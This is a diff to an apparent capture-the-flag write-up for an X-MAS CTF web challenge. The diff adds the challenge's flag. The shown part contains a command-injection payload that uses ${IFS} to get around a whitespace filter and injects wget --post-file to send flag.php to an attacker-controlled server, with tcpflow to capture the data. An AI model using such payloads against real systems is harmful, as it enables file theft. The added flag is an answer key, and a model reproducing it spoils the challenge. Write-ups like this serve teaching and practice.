@@ -43,8 +43,9 @@ From this code we can see it's a oob comand injection , and we can also see that
 
 First of all I set up a public aws instance and i also installed  ngix.  because the aws instances gives me a public ip , then I listened ngnix on port 80 and used this payload on the challenge : http://challs.xmas.htsp.ro:3001/?flag=${IFS}-${IFS}--post-file${IFS}flag.php${IFS}1.1.1.1(
 in place of 1.1.1.1 I put the public ip of the aws instance). Let's see how this payload works.
-First of all i used tge $IFS variable, which is the “Internal Field Seperator” with default value ```html<space><tab><newline>``` also works fine as a separator for commands , in this way the payload is a oob command injection with whitespace bypass , after i used the comand --post-file (this command is used to send the content of a file using wget) because i needed to get out to wget and send the flag.php to my aws istance.
+First of all i used tge $IFS variable, which is the “Internal Field Seperator” with default value ```<space><tab><newline>``` also works fine as a separator for commands , in this way the payload is a oob command injection with whitespace bypass , after i used the comand --post-file (this command is used to send the content of a file using wget) because i needed to get out to wget and send the flag.php to my aws istance.
 
 After i went to my ngnix and intercepted the traffic with  tcpflow , more specifically with this comand " tcpflow -p -c -i eth0 port 80 " and i could see the content of the flag.php
 
 ![xmas1](https://user-images.githubusercontent.com/59454895/103447731-6ac10100-4c8f-11eb-9363-1ebdd340e3ae.PNG)
+Flag:X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}
